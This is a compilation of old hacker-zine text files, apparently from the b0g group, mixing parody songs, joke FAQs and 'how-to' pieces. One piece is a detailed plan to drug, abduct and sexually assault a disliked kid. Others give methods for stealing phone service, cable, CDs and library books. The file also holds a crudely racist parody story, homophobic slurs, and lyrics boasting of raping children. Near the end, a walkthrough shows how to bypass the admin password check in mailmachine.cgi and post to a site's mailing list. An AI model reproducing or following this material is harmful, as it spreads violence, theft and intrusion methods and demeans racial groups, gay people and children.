to the tune of 'Holier than thou' by Metallica:



leeter Than Thou

No more!
The crap rolls on my screen again
clueless lamers driving me insane.
whispering around in chatrooms,
acting like a buncha buffoons
a n00k here, a n00k there.
none of you I will spare !
coz I am eleet, i don't just say it.
Its my conscience, and I know it!

   leeter than thou!
   I am
   leeter than thou!
   I am
   leeter than thou!

lame as ever, look at you
same old thing, nothing new.
Arrogance and ignorance go hand in hand
I am leet now, don't you understand ?
It's not who you are it's who you know
eleet that i am, it doesn't matter now.
pheer me now, coz i'd r00t you like that!
with just ping, tracert and netstat!

   leeter than thou!
   I am
   leeter than thou!
   I am
   leeter than thou!

Ok, this is something I’m masturbating over cos I imagine doing it to some 
kids I really don’t like :) 

- needings -

* someone you dislike
* someone that dislikes that person but likes you too
* 2 cars
* stuff to get the person to fall asleep with (preferred ammoniac orso)
* a knife
* a good alibi
* fucking guts (cos you need to speed over the road like in your car)
* masks or alikes
* some money

- let's go over to a wet dream - 

You besta do it at about 5 or 6 am..

Okay, first you take 1 car to the local 24h shop and buy some liqueur for 
more guts.. then drive a bit around and crash the car like on a tree.. Then 
walk back home and take car #2 which you let the other guy drive in 
cos he’s sober and drive over to the victims place... Make sure he's alone 
at home like or else his parents / boyfriend / dog is going to miss him 
and might call the police and stuff.. If he isn’t home alone go back to 
the 24h shop and buy more liquor and go back home to get pissed like and 
try it some other time.. Now if he’s home alone, you put on a mask and both 
walk to the door.. Each of you is going to stand on one side of the door 
(he left you right or roundwise but make sure he wont see you when he opens 
the door).. From this point, nobody has a name or a voice cos he'll prolly 
recognize both of them.. The one that’s standing next to the bell presses 
it so the victim opens the door like to see who’s outside.. The one that’s 
closest to him grabs him in this way so he cant scream but prolly will bite 
you in the hand... that’s where the knife comes in handy.. Now get the shit 
which makes him fall asleep for at least a hour... drag him in your car 
and drive as fast as possible (the guts part) to some other town orso.. 
The one that isn’t driving takes off the victims clothes and throws them 
out of the car for the poor homeless guys.. keep on driving till he wakes 
up and make him go to sleep again.. now this is the time to stop the car.. 
grab an EMPTY bottle which contained the liquor cos you don’t wanna spill 
such good stuff to a dork like him do you? ram it in his ass and kick him 
out of the car in some public area, preferred crowded or maybe some school 
with gay people on it so they will bumrape him etc.. Now he's all naked and 
getting shagged in the ass by this nice bottle and prolly freezing to death 
when he’s waking up go back to the liqueur store to buy more liqueur to 
celebrate a nice humiliation... Don’t talk about it anymore.. it never 
happened until you open the newspaper and are shocked by such mean people 
who harm such an innocent guy with a bottle you could have had sex with its 
neck.. Go to school and laff at him cos you’ve read the paper... don’t laff 
at him if you accidentally spoke to your mate cos then he'll know it is you 
and do the same to you if he has read this txt file :)

Have fun humiliating.. don’t do it to me cos I know more evil stuff than 
this and will make your live and your girlfriends life miserable :) your 
warned heh... Also, if your hamster gets aids, your sister starts to have 
sex with you, your mother starts to have sex with your hamster, WW]I[ 
starts etc etc after doing this stuff, I cannot be held responsible for 
it... Neither when that guy finds out and calls the cops etc... I cant be 
blamed for anything since I am the almighty God... FREE KEVIN.. FREE 
COMRADE... FREE WHORES... FREE WEED.... FREE SEX... FREE FASTFOOD... 
its all up to you...

Are you so poor that you cant pay for your own things? (Like me =\)  
Or.. 
 You have money but you just dont wanna pay?  Well.. heres the solution, 
 I've written a text today on how to get things for free... 
 
[ Index ]  

1. FREE CD's 
2. FREE PUSSY =]
3. FREE PHONE CALLS 
4. FREE CABLE
5. FREE LIBARY BOOKS  Heres The Text.   

1. Free CD's  -- Join BMG, Columbia House etc.. They give free CD's for a 
penny as you  join 'em etc.. Just use a different name.. you can use the 
same address...  thats all. I do it all the time. Never gave my real name.   
-- How it works: All it does is it, re-writes your account name in the same  
account.. deleting old informating so you keep getting cd's for free! =]   

2. Free Pussy  -- Pick up a hooker, fuck her. Then refuse to pay. What can she 
sue you  for? Rape? =]   

3. Free Phone Calls  -- The art of getting from phone calls from Ma Bell (AT&T, 
Hell South, NYNEX,  Hell Atlantic etc.. ) is called Phone Phreaking. I can write 
pages and pages of shit about this... but since I am out of cannabis I will have 
to say just  a couple things to get you on the path. Ok, back in the 1980's the 
US phone  system used a system of signalling based on frequencies sent across 
the  ph0ne system. For example, one could emit a frequency of 2600 Hz and get 
the  phone company to stop billing the call... This was in the glory days of  
phone phreaking. Now the shit is much harder.. with the introduction of  digital 
exchanges and the ESS signaling system. However there are ways..  currently the 
going thing is to emit a certain frequency down a pay phone that  emits the 
frequency that is sent to the phone company when a quarter is put  into the pay 
phone.. one could make unlimited calls. 
It does not work when  you have a human operator though (especially on Int. 
calls).. I use it  all the time in Miami to call all over the US.. But, now they 
are starting to  get smart.. and the phones are designed so it won't allow those 
frequencies to  be "heard" on the receiver part of the handset. This is very 
rare though.. To  get these frequencies.. use a program called bluebeep Search 
using archie or  netscape ( its tougher using netscape ) to find it. You can 
record it on normal  tape from your Sound Blaster.. The other common method is 
to find the  local phone exchange in your block.. (underground usually) .. then 
hook a  phone up to it and make your calls (using another phone line!) ... There  
are many philes out there with more details on doing this. Yet another  (outta 
1,000,000) method is to grab the frequencies emitted by a cordless phone  user.. 
then retransmit those frequencies.. (properly edit the  frequencies so that the 
number you want will be dialed ). Then the victim's  phone-receiver will think 
the real cordless phone is being used to make a  phone call.. You can call all 
the 1-900 numbers you want! There are philes out  there to help you.. but you 
must be mildly familiar with electronics. Well  thats it for phone phreaking 
from me in this phile.. but there's shitloads of  things to hack PBX 
-Private Branch exchanges , COCOTs -Company Owned Coin  Operated Telephones, 
loopbacks, outdials ...etc .. The devices used in  hacking the telco are called 
boxes .. after the red box which emitted the  2600 Hz .. then came blue boxes 
(payfones ) & beige , green , brown  etc... I always get the colors mixed up.. 
But who cares!     

4. Free Cable  -- Just use a Nintendo-TV splitter to splice in your house 
connexion from the  cable exchange box (at the back of your apt. complex) .. It 
is always wise to  connect a bunch of people to cable also... that way you won't 
be singled  out when they find out. Find the philes on cable theft for more 
details (wiring  basics etc).    

5. Free Libary Books  --  This is too easy, any moron already knows this.. 
Simply remove the magnetic  strip at the back, or in between the binding, of the 
book. Then walk out of  the library with the book in your bag or in plain view.. 
If caught say " Oh,  I'm sorry bitch.. I forgot to check the books out! ". Btw, 
a good practical  joke is to hide the magnetic strip in the property of some 
unsuspecting fuck- up, and watch the show as he tries to walk out of the 
library. Remember  stealing books is wrong, so only BORROW ref. books, =]   

Note: If you do get caught using any of these "r33t0" Techniques... Its not my  
problem.

 ____________________________________________________________________



First off before you go and fix any PC's you'll need to assemble a 
tool boxcontaining some things you'll need in your repairs.
-a large flat head screwdriver
-pair of pliers
-10 pound sledgehammer
-wood working chisel
-wooden mallet
-small crowbar
-large crowbar
-vice-garden hose
-heavy rock-tape
-small domestic animal
-friends monitor
-discman/walkman
-cell phone
-8ft of thick chain
-vehicle with trailer hitch
-beach
-some rope
-baseball bat
-2 or 3 fish heads

First off before beginning, place a good cd in your discman and palce 
yourheadphones on.  Next go out to your driveway or backyard to commence
repairs since the majority of all accidents occur in the home.  Better safe 
than sorry.  Don't forget to have the cell phone ready with 911 pre-called 
and already on their way.  Since it's kinda hard to dial with no fingers!

Q. I can't get the casing off my computer.
A. This is quite a common problem. Take your sledge and strike the casing on 
its top right in the middle.  After a few hard shots the sides should bend 
out and you now have access to your PC.

Q. The inside is all dusty and dirty, how should I go about cleaning it?
A. Take your PC outside and wash it throughly with the garden hose.

Q. My Computer keeps displaying an "Illegal Operation" message, what do I do?
A. Report it to the proper authorities immediately! There is nothing more 
serious than breaking the law!

Q. All this repair is making me hungry...
A. Tie a long length of rope to your opened PC.  Firmly secure the fish heads 
inside.  Go down to your closest beach and place the pc in some deep water.  
Atleast 20ft or so.  Make sure you tie your end to something! :)  Come back in a 
couple hours, and hopefully you should now have some juicy crab inside when you 
bring the PC back up.  If you didn't catch any crab, try again or hit McDonalds 
or some shit like that.

Q. I having trouble with my floppy...
A. They have pills for that kind of problem...

Q. No my floppy disk, it's stuck in my drive.  How do I get it out?
A. Wedge your flat head screwdriver into the drive and try to pry it out.  If 
this isn't working then grab hold of the disk with your pliers and yank.
If it's still stuck (or you're too weak!) then get enough disk sticking outto 
place in the vice.  Tighten it as much as you can, and then tie the chain around 
the computer.  Attach the chain to your car and get in.  Place the car in 
neutral and rev up the engine.  When you got it going, kick it into drive and 
you should rip that disk right outta there!  If not you'll now have a portable 
vice, since it'l rip right off your workbench.

Q. I'm having trouble removing my RAM chips.
A. These lil buggers can be tricky.  The easiest way is to latch on with your 
pliers and start pulling and twisting till the pop out.  Or you can take your 
heavy rock and start hitting the chips from the side until they tilt to the 
side, then they should come out easily.

Q. I have an older CPU (pre Pentium II).  How do I get it out?
A. First off try the chisel and mallet.  This may not get the chip out.  If it 
doesn't, then take your small crowbar and pry it up a little.  Then get the big 
crowbar and pop the sucker out.
Q. My little brother keeps sneaking into my room and messing around with 
myPC, how can I get him to stop? 
A. Take off the outer casing (see above) and place the small animal, preferably 
a cat, inside.  Replace the casing, and plug the PC back in.  Wait in the closet 
and watch.  When your brother comes in and turns on the PC, the combination of 
voltage and cat should produce some good results.  The resulting noise should 
scare him shitless and keep him out of your hair for some time.

Q. The time on my system tray is wrong, and it's starting to bug me.  How do I 
fix this?
A. Place a piece of tape over that part of your screen.  Outta sight, outtamind!

Q. My monitor is completely wrecked, what should I do?
A. Don't you remember me saying you'd need your friends monitor at the start of 
this.... ;)

Q. I've tried everything you've suggested, and it still doesn't work.  Now what?
A. Take that baseball bat and use your imagination....

Well that's all for now...
If you have any tech questions

INTRODUCTION
____________________________________________________________________________


Welcome to the tutorial of "How to Rob a Bank" for elitx0r k-R4D k1dd13Z" v1.0
Many people think that you need to hire elite soldiers and muscle to rob a bank.
That is not the only way ...If you really wanted to hack a bank wouldn't you 
want to do it nice and clean, with style ?
Yes ...
You would.
You don't want people lying dead on the 
floor and people sounding alarms getting your ass into bigger trouble 
than it was before.
So ... the question would arise: "Come on ninja boy, what do I need to do ?"

Easy ...
Continue on to Section 2.
____________________________________________________________________________

SECTION 2: Getting prepared
____________________________________________________________________________

You will need the following :

1) An 31337 10 year old laptop like the ones from "Hackers" s0 that j00 can be 
like elitx0r n shit and show off to the chix0rz in the bankx0r how s3Xy j00 are.

2) EMP Generator.
You can get these from black markets way out in the outskirts of 
Russia or if you have enough $$$ get it from Bill Gates. 
He should hook you up with some nice equipment. 
    (But be warned, might not be a stable version)

3) NERV- / Sleeping- GAS. + GAS MASKS
I could explain how to make the gas but I just can't be bothered so ehh 
look it up in your handy Terorrists Handbook for exact recipes.

4) A truck to trash the money into ... duh. Unless you want to carry billions 
of $$$ on the train...
____________________________________________________________________________
 
SECTION 3: int void(switch brain on);
____________________________________________________________________________


You have all the tools, so you are practically ready for the hit.
Once you arrive at the bank switch your truck off.
The EMP Generator should be located in the back of your truck.
It would be best if someone were to help you.
One person should control the EMP Generator and the other
should walk into the bank.
Once the EMP Generator is switched on all electrical equipment will be disabled 
.... .... FOR GOOD. So better keep that truck off unless you want to use public 
transport for all that cash. When you are inside the bank everything will most 
probably go berserk. Chaos will havoc outside, car alarms and window wipers will 
be turned on and off.
Your elit0 h4x0r b4wX will not be affected if you have it switched off so leave 
it off. Now when the EMP Generator is switched on, in the same time you need to 
throw NERV Gas or some other sort of Gas which is invisible to the human eye 
in the bank. Don't forget to put on that gas mask before you do it, otherwise 
you can kiss your plan goodbye. Once everyone (the whole building) is affected
lock the doors and take those Glock 17's off of the security guards so you 
can have some fun when you get home. Hook up your h4x0r l4pt0p to some computers 
and put in some l33t0 v1ruz to sh0w them how 31337 j00 are.
Oh yeah and don't forget porn, cause feds love pr0n ........ No kiddie pr0n 
though cause that's for like pedophilez n shit and you're a NINJA not a pedo.
The EMP Shock will actually unlock all doors which use electronic locking
like they use at banks ... so just open up the door and take out the loot.
While all the chaos is going on outside everyone will be baffled by it and will 
Probably be looking at it until it stops, so once you have the money get your 
friend in the truck to come out and help you take all the money.
Drive off, and remember don't drive faster than 60 km/h / 45 mph.

"Thank the Lord Harry!" exclaimed Dicks. "It's the summer hols!" he said. 
Dicks was going to spend the hols with Johnny, Bumcheeks and Fanny - and 
her rag-a-muffin dog, Wagtail. "And who knows what corking japes lay 
before us!" he wondered, as the train Puf - Puf - Puffed into the station. 
"Now let's NOT displease Aunt Whiplash and Uncle Rubum this summer," said 
Johnny, who was the oldest and strongest of the Five, as they set out to 
meet their hosts. "By crikey it's hot!" he exclaimed, struggling under the 
girls' straining packages. "I wonder where that Negro servant of Uncle Rubum, 
Nignog Robinson, is". And with that the intrepid bunch set off to the quaint 
cottage on the moors they would be staying in.

"I'm scared! This is dangerous!" whimpered Bumcheeks, who was the smallest 
and a girl. Far in the distance was a small island which they could see from 
Uncle Rubum's pantry window, that was frightening.

" Uh think you'd bettuh not be a wandering in them parts, mastuh" rumbled the 
black face of the Negro servant, Nignog Robinson. His black, cut-throat eyes 
flashed at the Five cruelly. "They sah its - a haunted" he concluded, his 
pickaniny teeth glinting criminally. He ran his clumsy, black hand through 
his hair and lumbered shadily out.

As if on prompt, the Five looked out across the sea the foreboding, mysterious 
island. "Jiminey! I don't believe the black man," said Johnny. "He looks like 
a criminal. I want to see just what it is that makes that island so mysterious. 
We should explore it".
" Oh yes, Johnny, YES YES YES" said Dicks. "oh lets! Lets!" Dicks was the 
smallest of the boys and greedy, sulky,skinny and cowardly. Everyone knew that 
even Fanny, who looked like a boy with her big hands and ample moustache, was 
stronger than him. And with that they went to supper with Aunt Whiplash and 
Uncle Rubum, who afterwards sent them straight to bed. "Don't complain" snapped 
Uncle Rubum. "I am your elder and shall have you thrashed appropriately for any 
riotous behaviour, by the right of the Lord."

"Yawn" muttered Johnny. "cripes, I can't sleep!". Then he opened his eyes wide 
with surprise and felt something wet on his leg. "oh, wagtail, you ARE a bother, 
he said, shooing the dog away. Then he reached for his binoculars to see more 
clearly the peculiar sight he glanced out his window. There, on the choppy, 
windy sea, was a boat heading for the island! "I'd bet two farthings that it's 
the negro servant, Robinson" he frowned. "There's something suspicious in his 
black face."

The next day the Five set off to the mysterious island in a fishing boat on the 
beach, after secreting lots of ginger ale, pop, flashlights, cake and batteries 
into their plastic macks, away from the sight of uncle Rubum. "GOLLY" said 
Dicks. 
"What an adventure!" he said, his voice muffled as he ate the cakes and drank 
the gingerbeer and ice-cream. Then he was thoroughly sick. He stayed behind and 
cried while the rest of the Five explored the island. He deserved it as he was 
the greediest and skinniest.

"It's a nice sunny day!" smiled the girls. But Johnny was more intelligent and 
didn't burble pleasantries about flowers and whatnot. He was a boy. His honest, 
responsible face frowning with duty, he picked up what he had spotted, 
recognised it, and gasped in horror. The girls screamed.



"If only I wasn't so greedy!" moaned Dicks, pacing around the small boat 
clutching his tummy. "I'm a rotter. And the others will be having such wizard 
adventures!" he moaned. Dick was jealous. He stomped around the beach in a 
childish tantrum.

Johnny opened his hands. The evidence was still there. In his responsible, 
serious view was a piece of watermelon, a banana skin, and a fried chicken wing. 
"Yes the puzzle is all clear to me now" he said. "Nignog Robinson has been 
coming here to this island. His voodoo claptrap tribal story about the place 
being haunted was just a sly cover up to mask his true, deceitful purpose here." 
The black man was a liar; he had been stealing food from the pantry and 
smuggling it to the island in his dark murderous hands, evil deeds going through 
his savage head.


"Wha the fu - You children shouldn't be here, your Uncle will be most 
displeased" said a surprised Robinson, his peekaboo eyes wide in surprise. In 
the foliage behind, concealed by their filthy appearance, poked out the sallow 
faces of several gypsies.
"I just don't understand!" wailed Bumcheeks, her hands out of her plastic mac 
and waving around in a foolish, girlish fashion. Fanny stroked her moustache in 
puzzlement. It took one moment for Johnny to study the scene before he bravely 
made his conclusion. 
"Don't worry Five" he said in a tone of leadership, "It is all clear to me". 

Johnny took a hard swig at his bottle of Ginger Pop. "These are the travelling 
gypsies who escaped from the Atomic Research Institute in London, our Capital 
City. Nignog Robinson has smuggled them here to this island, robbing our Great 
Britain of these important research subjects" ,he explained pointing at the 
ragged mob of travellers, their dirty heads bowed in subservience. "Good Lord, 
without such research the evil communist Reds will conquer the globe!"

Before he could continue Johnny was caught off guard. "That's enough Johnny!" As 
Johnny span round he spotted the local policeman Constable Fairman approach 
grinning  from behind a large rock, the sun sparkling on his shiny blue helmet. 
"We've been watching this Black Man for some time. As soon as I saw his face I 
was suspicious, only despite his scheming, cheating ways we couldn't prove a 
thing", explained the Policeman. "Nobody move, I command you in the name of the 
Law!" he exclaimed.

From a concealed pocket the black man produced a shiny gutting knife. "That's a 
right young mastuh" he rumbled, sweating in the sunlight with a glare at the 
Five. "It aint right and no-one's going to go ahurting these folks no moah" he 
warned, stepping backwards towards the boat, the knife tiny in his huge hands, 
his dark threatening frame looming over them like a beast of burden, more animal 
than Man. Behind him, the shabby dirty gypsies shuffled onboard, with the 
occasional moan escaping faintly from their festering mouths.

"DO something!" squealed the girls in unison. Brave Johnny noticed wee dribble 
down his woolen shorts. Robinson reached the creaky old boat. "COMMUNIST!" 
bellowed Constable Fairman. With skill he drew his revolver and gunned the rogue 
down. "ANARCHIST, SUBVERSIVE!" he then proclaimed, emptying the chamber into the 
twitching, bloody form of Nignog Robinson, now writhing on the ground, his 
massive hands held uselessly around his head, in a primitive attempt to shield 
himself from the bullets. A crack shot, Constable Fairman then tied up the 
cowering Gypsies, helped by the intrepid Five.

"Good heavens, what's all this hulabaloo?" exclaimed Aunt Whiplash when they 
were all returned safely to the cottage, with a policeman and a group of 
strange, crooked types all tied up. She wiped her hands on the patterned apron 
tied around her considerable girth, as Johhny patiently explained everything; 
his suspicions about the black servant; the mysterious island and the escaped 
gypsies. "And so we caught the escapees and Constable Fairman showed us around 
the Police Station as  reward!"

"What a WIZARD adventure!" beamed Aunt Whiplash, as Uncle Rubum gave a 
disapproving frown from behind his newspaper on the sofa, and scratched his bald 
dome. "You simply MUST come to spend your holidays with us again!"

"HOORAH!" said the Five all at once. And with that they toasted with a bottle of 
ginger pop.

7.  How does Prae avoid getting the shit beat out of him from black people?
Well, this is a hard question! Since prae is racist and 2/3rd's of his 
vocabulary contains the word nigger, I don’t know how he doesn’t get the 
shit beat out of him.  I've known him for 4 years and we were friends and then 
someone (Cam2o) told him I was black and he started acting like an asshole 
to me.  Well to not get beat up he must either be really strong or smell 
like shit and no one will go near him.  We will never know...

6.  Why do pr0n stars get paid?
I would have sex for free!  I mean, wouldn't you?  I guess it would be 
better if ya got paid but still, SEX IS SEX!  That's like getting paid to 
eat candy, killing two birds with one stone.  I now officially hate all 
pr0n stars, YOU ALL SUCK!@# (I will still continue to whack off watching 
pr0n though)  And  do not fucking email me telling me to say porn not pr0n 
cause I will get pissed off AND KILL YOU!#@ DIE BITCH DIE!  No one will 
ever know this answer...

5.  What the fuck was up with the movie hackers?!?!?
That movie warped my fragile little mind...seriously!  Ok, lemme point out 
all the wrong things in that movie, well maybe just a couple.  First off, 
when you break into a computer it DOES NOT look like a fucking video game 
and why would you go for the garbage file?  First thing I would do is 
browse their pr0n collection to see if I can get some whack-off material.  
This one time I broke into whitehouse.gov I checked out Bill Clinton's pr0n 
collection and he has some crazy lesbo pr0n, he said I could borrow some 
someday (heh that probably put me on some government list where they spy on 
me and shit, uh o spaghettios!#@).
Why do people still watch this movie and enjoy it...no one knows...

4.  Why don't the "Boy Bands" admit that they are gay?
We all know they are, I mean listen to em sing and talk.  They sound like 
they have a mouthful of cum.  They never have any hawt chicks in their 
videos either, if I was a singer I would have an ass and titties contest, 
and whoever I thought looked best I would fuck in my video (If I didn't 
have a girl, which I do)  We all know that they are slobbing knob and 
licking nut on that big tour bus of theirs.  Just admit it ya little 
faggots...

3.  How does Hugh Heffner get so many chicks?
I think this pisses a lot of guys off, most people will say its because he 
owns playboy but that cant be true because Bill Gates doesn't get shit and 
he’s richer than Hugh (Not like I like microsoft or bill gates)  The only 
reason we guys can think of is.. HE MUST HAVE A HUGE COCK!#@

2.  Why does pussy smell like tuna?
I don't think anyone has the answer to this question.  Your going in to eat 
it, and whoa!@# the smell overpowers you and you pass out.  WHY?  Is it 
because their moms stuck tuna in their in hopes of preventing you from 
having sex?  No one knows...

1.  Why do you always have to piss after masturbating?
This is a real wonder because I have asked a bunch of people and they 
answered just like I would have, they ALWAYS have to piss after 
masturbating.  Is this something God did in hopes of keeping us from 
masturbating?  Well, its not working, as long as men have penises they will 
keep jerking it.


These are the REAL 7 wonders of the world, these questions will probably 
never be answered. We will have to keep wondering forever and ever. *cough* 
cheap advertisement = check out www.prence.org *cough* heh, peace

Guys: whats the most important part of your body? No, Prae, not the ass.... 
*sigh*... 
K-rad-bob has it! It's the penis! For many years I have been a practitioner of 
penile fitness. Here are a few excersizes that can keep you from being shriveled 
and weak and gay in old age, and have your wang thick and long. For morons, I 
have included illustrations:

**_____
**_____\
*()    \|
        
Before

--------

**
**________________________,
**    Y    ^         V   |\_
**_A___Y____/___V________|/

After
(The letters and shit are veins..... damn ascii art limitations to hell!)

#1. The Kegel

This excersize can lengthen your penis by pushing out on the penal root, and 
keep you from pissing yourself when you are in a nursing home. Simply flex the 
muscle around the penal root. If you dont know which one it is, start a stream 
of piss and stop mid-piss. 
The muscle you used is the one you should flex. This also improves blood 
circulation into your wang. First, flex this muscle and release it as fast as 
you can over and over. Do 10 sets of 10. Then, hold it as long as you can. Do 
this 15 times. Now, hold it for 3 seconds, release for 1 second, hold for 3 
seconds, release for 1 second... etc. Do 5 sets of 10.

#2. The Nut-Lifter

	This excersize, when used properly, can keep you from jizzing all over 
your 'life partner' too early. You want to try to elevate your sack. This may, 
at first, involve a bit of stomach flexing, but after a while you will know what 
muscle to flex. This works best and is most noticeable on a hot day when your 
sack is hanging almost over your asshole. It has been proven that a male cannot 
ejaculate until his balls are packed up against the rest of him. So as soon as 
you have mastered this excersize, practice preventing the balls from going up. 
Try to keep them away from your body without using your hands, because you hands 
will be busy groping titties. MMMmmMMMmmmMMMmmMMMMmmmm titties.... 

	Anyway, I will now discuss general penal health. It is best to masturbate 
at least six times a week. Remember, this is ther MINIMUM amount. This regulates 
the supply of blood and keeps the veins in action. It also empties your nuts, so 
you dont have little wet dreams about Acid Burn. (omg angelina... yes baby! 
aah!!! erm.... back on topic...). There is also a myth that Mountain Dew will 
shrink your penis and make you sterile. This is not true. 
What brought this about is the fact that one of the coloring agents in Mountain 
Dew can, in very high and almost lethal doses, decrease your sperm count by 
about 0.5%. A healthy young man can, in one ejaculation, repopulate North 
America. I doubt any of you have the need to be professional Adams, and if you 
do, well fuck the population of Uruguay. ;). You also need tho do the above 
excersizes at least one a day. Its also really good if you can get a chick 
to fuck you. It can like.... be good on your psyche.... and your nuts.

/msg'ing me cause she thinks she's gonna get ops in #hackphreak
(grrrr, ARF ARF) Or on a tv show, with a xxx-large shirt on
Drivin up the block in the car that I raped lori13f in 'Me in
Lookin for little kiddies, dressed all sezcy in
blue and red like I don't see what the big deal is
Rape kiddies? twelve inch bigger than darkraven
Pissed off, cause clocker and 'sektorgrl just missed all this
Watchin all these kiddie imitations get rich off 'em
and get dollars that shoulda been there's like they switched wallets
And amidst all this Crist' poppin and wristwatches
I had to sit back and just watch and just get nauseous
and walk around with an empty bottle of Remi Martin
raping kids that of a 11-year-old skinny Cartman ("God damnit!")
I'm ghay and want Ricky Martin
with instincts to rape N'Sync, don't get me started
These fuckin brats can't hack and Britney's garbage
What's this bitch retarded?  Gimme back my sixteen dollars
All I see is adults in magazines posing
Whatever happened to leeching and c:\pr0n\kids\asian?
Whatever happened to catchin a good-ol' fashioned
passionate kid-raping and gettin your ass fucked and your hole widened?
New Kids in my room, I think I raped them too
Boy/girl nicks make me stiff
And I can't wait 'til I fiddle all you kiddies in private
I'ma love it.. (hahaha)
The whole Undernet don't like me (uh-uh)
Said some shit in #b0g to spite me (yup)
Then went and ate loads just like me (hehe)
A bunch of little kids wanna be just like me
and run around screamin, "I got raped, yeah, by rlox" (nah nah)
I think I was put here to rape the world
and uNF your little 4-year-old boy or girl
Plus I was put here to put fear in kiddies who say I'm their daddy
and call themselves "shaven" cause they want me
Accipter and clocker
Claimin Detroit, when y'all live twenty miles away (fuckin punks)
And I don't haxs0r, I'll /mode +b you fuckin faggots the fuck out
Ask 'em about the room they was at when they snuck out
after they ducked out the back when they saw me and pinged out
(AHHH!) Ducked down and got packets shot at they box, blaow!
Look at y'all runnin your mouth again
when you ain't seen a fuckin Mile Road, South of 10
And I don't need help, from clocker, to chat up two kiddies
in #teensex, who may try to /msg me with their pictures
"Kiddie Fiddler," you damn right, Kiddie Fiddler
I don't pay for my pr0n like you two little flaming faggots!

Chorus Two: Kent Browning

Cause I'm, just Kent Browning (Kent Browning)
I'm not a programming h0,
I'll ban your host if you talk about me (you talk about me)
Come and see me in #gaydogsex alone
if you feds doubt me (feds doubt me)
And if you wanna packet my ass
then come try your best DoS at me (your best DoS at me)

Is it because you love me that y'all expect so much of me?
You little groupie bitch, get off clocker, come fuck Daddy
Now because of this blonde mop that's on top
and this fucked up head that I've got, I've gone pop?
The underground just spunned around and did a 360
Now these kids packet me and act like big bad haxs0rs
"Oh, he just did some shit with lori13f,
 so now he thinks he's too big to do some shit with clocker and Accipiter"
My fuckin old navy captain suin for ten million
He must want a dollar for every kid I've been rapin'
Shit, where the fuck you think I picked up the habit?
All I had to do was go in my room and /msg kiddies
Which is it wh0re, c:\pr0n\kids or c:\pr0n\adults?
It doesn't matter your fserve sucks my ass!
Talkin about I fingered my ass
He's just aggravated I won't ejaculate in his ass (Uhh!)
So tell me, what the hell is a navy-seal to do?
For every million I make, another parent sues
Family fightin and fussin over who wants to schmack me up proper
All the sudden, I got 90 more pictures (Hey it's me!)
A series8 and series9 which I've never seen
or even bothered to look at until I got sent them from HP
Now everybody's so happy and proud
I'm finally allowed to step foot in my little kiddies house
Hey-hey!  And then to top it off, I walked to the newsstand
to buy this kiddie-pr0n magazine with a food stamp
Skipped to the last page, flipped right fast
and what do I see?  A picture of my whole c:\pr0n directory
Okay, let me give you motherfuckers some help:
uhh, here - SERIES 15, SERIES 15
Now your magazine shouldn't have so much trouble to sell
Ahh fuck it, I'll even buy a couple myself

One day I was visiting www.b0g.org to see what stunts k-rad-bob and the
rest of the crew were up to. After a bit of looking around I noticed
that they used a CGI script which is called mailmachine.cgi, from Mike's
World (http://www.mikesworld.net). I had done some auditing on that script
some time ago, and remembered that there was a flaw which enabled anyone
to post to the mailing list as the owners, without knowing the password.


The script works like this:
~~~~~~~~~~~~~~~~~~~~~~~~~~~

To send out mail you first have to log in with password which is set in
the CGI script.

http://localhost/cgi-bin/mailmachine.cgi?admin  - and log in.

If your password isn't equal to the one set in the script you will get
an error message. (surprise)

if ($in{'adminpass'} ne "$adminpass") {&adminerror}

If it is the correct password you will be sent to a panel, and from
there you are able to send mail to the subscribers - but from here on,
the script will not check if you in fact have entered the password
earlier on or not.

So, install mailmachine on your box, set "$adminpass = gay-rad" and log
in. Then save the html-source, change every occurrence of
"/cgi-bin/mailmachine.cgi" to "http://www.b0g.org/cgi-bin/mailmachine.cgi"
then write a mail, and press SEND and you're done. Yes it is true, only a
genius can do this!

So anyway, I mailed this information to K-rad-bob and Prae. A few days
later I received a mail from K-rad-bob telling me that this flaw had in
fact been exploited at b0g, and an "utterly horrible email" was sent out
to everyone on the list.

This was the e-mail "Nomen Nescio" sent out:
__________________________________________________

I, k-rad-bob, hereby recognize all gay people
as my equal brothers. Last night I accidentally
put my two fingers up my ass - and what a great

I immediately understood what had happened.
I had at last realized the fact that I am gay!!

So, from now, not ONE bad word about gay people.

b0g == gay and we are proud of it!

Ray guns?, (I could not think of a good title!) well sort of...

HERF (High Energy Radio Frequency) guns can fire a high-powered
focused radio pulse through a short distance, which depends mainly
on the power and size.

The have been numerous reports of the Russian Mafia and other
criminal organizations to be using RF weapons to disable alarm
systems in order to commit their nefarious acts without the
police being alerted. Most of these have been hoax's and FUD.
though Law enforcement has benefited from the use of HERF weapons,
as the have been reports of police using them to end high speed
chases, by disabling the electronics in the criminals car, so
car will role to a halt. Though I have heard reports of people
trying this experiment and being unsuccessful as neither the
electronics nor the ignition systems of car engines are apparently
very vulnerable to high amplitude electromagnetic pulses. But cars
in close proximity (not too close though!) to a nuclear detonation
have been reported to have shut of due to the powerful EMP pulse
that is produced. So it works, you just need a lots of power.

Public demonstrations and rumors:

The was an experiment where a car was fired at by a HERF gun
which resulted in the car stuttering  slightly but continuing to
run. Though it did effect the running of the car so a more powerful
burst will most certainly stop it.

Another demonstration of a HERF gun was shown, in which two
computers were the test subjects. Both computers crashed and there
was some slight data loss on the hard drives within.

TV shows have not been slow to cash in on the 'HERF hype', as one
TV show feature a so called  HERF gun which was placed very close
indeed to the target computer. Upon activation of the  device the
computer crashed, though the persons who set up the demonstration
might have just used a big water pistol to destroy the target
computer since it was so close.

Also a live demonstration of a HERF gun was going to take place at
the DefCon one year. Though the  demonstration was cancelled at the
last minute, reportedly due to the 'advice' of the FBI.

Even more sinister applications of HERF technology have been
reported though it is still  hard to see which is fact and which is
fiction. The applications include Murder at up to a 1km by giving
the victim a artificial heart attack. Although are report that the
soviets used this technique to kill goats at 1Km, though I have no
idea if the reports were real or not.


Here is the theory behind HERF bursts:

The general idea is to set up an L-R-C circuit and destabilize it.
For example, we know the  change in emf (E) is related to the ke
quantities (L = inductance, R = resistance, C =   capacitance) by:

L (d^2 I(t) / dt^2) + R (dI(t) / dt) + I(t)/ C = dE(t)/ dt

Where I(t), and E(t) are time-variable

Under suitable conditions it is possible to induce a voltage 'spike'
which is the   equivalent of a HERF burst.

It is fairly well known that *all* electrical circuits containing
an inductance (L) are intrinsically explosive.

Thus, if such a circuit is somehow disrupted, there is an explosive
release of magnetic  energy, of order:

W = 0.5 LI^2

Where L is the inductance (say of the inducting coil in the circuit)
and I is the current.
Say, for example, that L = 10 H (10 Henries) and I = 20A, then:

W = 0.5 (10H) (20A)^2 = 2000 J (Joules)

This is a fair amount of energy.

